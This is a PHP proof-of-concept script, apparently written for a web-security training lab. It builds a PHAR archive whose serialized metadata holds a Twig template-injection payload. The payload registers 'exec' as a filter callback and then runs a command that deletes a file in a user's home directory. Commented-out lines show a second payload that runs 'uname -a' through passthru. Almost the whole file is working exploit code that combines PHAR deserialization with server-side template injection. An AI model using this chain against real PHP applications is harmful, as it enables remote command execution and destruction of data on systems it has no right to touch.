<?php

class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;
        //Create a new instance of the Dummy class and modify its property

        $dummy = $object;

//        $dummy->callback = "passthru";

  //      $dummy->fileName = "uname -a > pwned"; //our payload

        // Delete any existing PHAR archive with that name

        @unlink("poc.phar");

        // Create a new archive

        $poc = new Phar("poc.phar");

        // Add all write operations to a buffer, without modifying the archive on disk

        $poc->startBuffering();

        // Set the stub

        $poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

        /* Add a new file in the archive with "text" as its content*/

        $poc["file"] = "what";

        // Add the dummy object to the metadata. This will be serialized

        $poc->setMetadata($dummy);

        // Stop buffering and write changes to disk

        $poc->stopBuffering();

?>


